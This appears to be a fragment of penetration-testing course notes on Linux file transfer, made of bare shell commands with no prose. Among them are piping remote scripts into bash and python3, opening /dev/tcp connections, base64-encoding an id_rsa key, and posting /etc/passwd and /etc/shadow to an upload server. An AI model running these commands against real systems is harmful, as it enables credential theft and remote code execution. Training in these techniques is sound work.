...
```shell-session
Pwn1Sec@htb[/htb]$ cat id_rsa |base64 -w 0;echo
...
```shell-session
Pwn1Sec@htb[/htb]$ echo -n '' | base64 -d > id_rsa
```
...
```shell-session
Pwn1Sec@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```
...
```shell-session
Pwn1Sec@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```
...
```shell-session
Pwn1Sec@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```
...
```shell-session
Pwn1Sec@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
...
```shell-session
Pwn1Sec@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80
```
...
```shell-session
Pwn1Sec@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```
...
```shell-session
Pwn1Sec@htb[/htb]$ sudo systemctl enable ssh
...
```shell-session
Pwn1Sec@htb[/htb]$ sudo systemctl start ssh
```
...
```shell-session
Pwn1Sec@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt . 
```
...
```shell-session
Pwn1Sec@htb[/htb]$ sudo python3 -m pip install --user uploadserver
...
```shell-session
Pwn1Sec@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
...
```shell-session
Pwn1Sec@htb[/htb]$ mkdir https && cd https
```

  Pwnbox - Start Web Server

```shell-session
Pwn1Sec@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate /root/server.pem
...
```shell-session
Pwn1Sec@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```
...
```shell-session
Pwn1Sec@htb[/htb]$ python3 -m http.server
...
```shell-session
Pwn1Sec@htb[/htb]$ python2.7 -m SimpleHTTPServer
...
```shell-session
Pwn1Sec@htb[/htb]$ php -S 0.0.0.0:8000
...
```shell-session
Pwn1Sec@htb[/htb]$ ruby -run -ehttpd . -p8000
...
```shell-session
Pwn1Sec@htb[/htb]$ wget 192.168.49.128:8000/filetotransfer.txt
...
```shell-session
Pwn1Sec@htb[/htb]$ scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/
